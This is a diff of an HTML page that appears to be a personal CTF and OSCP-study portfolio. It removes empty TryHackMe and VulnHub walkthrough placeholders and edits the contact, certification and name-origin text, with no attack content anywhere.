                 <div class="sub_dropdown">
                     <button class="sub_dropdown_button"> <img src="images/vulnhub_icon.png" alt="img"> <span>DC9</span> </button>
                     <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
                         <br>
                         <br>
                     </div>
                 </div>
-
             </div>
         </div>
         <!-- ========================vulnhub_content======================== -->
-        <!-- ---------------------------------------79--------------------------------------- -->
-        <!-- ========================tryhackme_content======================== -->
-        <div class="dropdown">
-            <button class="dropdown_button" id="tryhackme_button"></button>
-            <div class="dropdown_content" id="tryhackme_content">
-
-                <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/tryhackme_icon.png" alt="img"> <span>Throwback</span> </button>                    
-                    <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                    </div>
-                </div>
-                <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/tryhackme_icon.png" alt="img"> <span>Holo</span> </button>    
-                    <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                    </div>
-                </div>
-                <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/tryhackme_icon.png" alt="img"> <span>Wreath</span> </button>    
-                    <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                    </div>
-                </div>
-                <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/tryhackme_icon.png" alt="img"> <span>Breaching Active Directory</span> </button>    
-                    <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                    </div>
-                </div>
-                <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/tryhackme_icon.png" alt="img"> <span>Enumerating Active Directory</span> </button>    
-                    <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                    </div>
-                </div>
-                <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/tryhackme_icon.png" alt="img"> <span>Lateral Movement and Pivoting</span> </button>    
-                    <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                    </div>
-                </div>
-                <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/tryhackme_icon.png" alt="img"> <span>Exploiting Active Directory</span> </button>    
-                    <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                    </div>
-                </div>
-                <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/tryhackme_icon.png" alt="img"> <span>Persisting Active Directory</span> </button>    
-                    <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                    </div>
-                </div>
-                <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/tryhackme_icon.png" alt="img"> <span>Bandit</span> </button>    
-                    <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                    </div>
-                </div>
-
-            </div>
-        </div>
-        <!-- ========================tryhackme_content======================== -->
-        <!-- ---------------------------------------70--------------------------------------- -->
         <!-- ========================legacy_pwk200_content======================== -->
         <div class="dropdown">
             <button class="dropdown_button" id="legacy_pwk200_button"></button>
@@ -3681,7 +4124,16 @@
                     <button class="sub_dropdown_button"> <img src="images/offsec_legacy_white_icon.png" alt="img"> <span>Topic1</span> </button>
                     <div class="sub_dropdown_content">
                         <span class="step_title">content_title</span>
-                        <br>content
+                        <br>
+                        <br>
+                    </div>
+                </div>
+                <div class="sub_dropdown">
+                    <button class="sub_dropdown_button"> <img src="images/offsec_legacy_white_icon.png" alt="img"> <span>Topic1</span> </button>
+                    <div class="sub_dropdown_content">
+                        <span class="step_title">content_title</span>
+                        <br>
+                        <br>
                     </div>
                 </div>
                 <span class="step_title">mind of steel, and more:</span>
@@ -3703,13 +4155,7 @@
                         <span class="step_title">step 1</span>
                         <br>
                         <br>
-                        <br>
-                        <br>
-                        <br>
                         <br><span class="step_title">step 2</span>
-                        <br>
-                        <br>
-                        <br>
                         <br>
                         <br>
                     </div>
@@ -3730,13 +4176,7 @@
                         <span class="step_title">step 1</span>
                         <br>
                         <br>
-                        <br>
-                        <br>
-                        <br>
                         <br><span class="step_title">step 2</span>
-                        <br>
-                        <br>
-                        <br>
                         <br>
                         <br>
                     </div>
@@ -3744,10 +4184,10 @@
             </div>
         </div>
         <!-- ========================pico_ctf_content======================== -->
-        <br><span>Currently working on OSCP exam</span>
+        <br><span>Currently,I'm working on OSCP exam</span>
         <br><span>==========Contact==========</span>
         <br><span id="protectedEmail"></span>
-        <br><span><a href="https://www.linkedin.com/in/joe912693295" target="_blank">LinkedIn Profile</a></span>
+        <br><span><a href="https://www.linkedin.com/in/joe912693295" target="_blank">My LinkedIn Profile</a></span>
         <br><span>==========Certifications==========</span>
         <br><a href="images/doc/Cisco Certified Internetwork Expert(Security).pdf" target="_blank">Cisco Certified Internetwork Expert(Security).pdf</a>
         <br><a href="images/doc/Cisco Certified Network Professional(Enterprise).pdf" target="_blank">Cisco Certified Network Professional(Enterprise).pdf</a>
@@ -3765,7 +4205,7 @@
         <br><a href="images/doc/Chinese Mandarin Rank Examination original.jpg" target="_blank">Chinese Mandarin Rank Examination original.jpg</a>
         <br><a href="images/doc/Chinese National College English Test(CET).jpg" target="_blank">Chinese National College English Test(CET).jpg</a>
         <br><a href="images/doc/Chinese National Computer Rank Examination original.jpg" target="_blank">Chinese National Computer Rank Examination original.jpg</a>
-        <br><span>joe95 name origin: Chinese family name:周 "ZHOU" which pronounce like "joe". But there already has millions of "joe", so I add "95" because I was born in 1995.</span>
+        <br><span>English name origin: Chinese family name:周 "ZHOU" which pronounce like "joe". But there already has millions of "joe", so I add "95" because I was born in 1995.</span>
     </main>
     </body>
 </html>
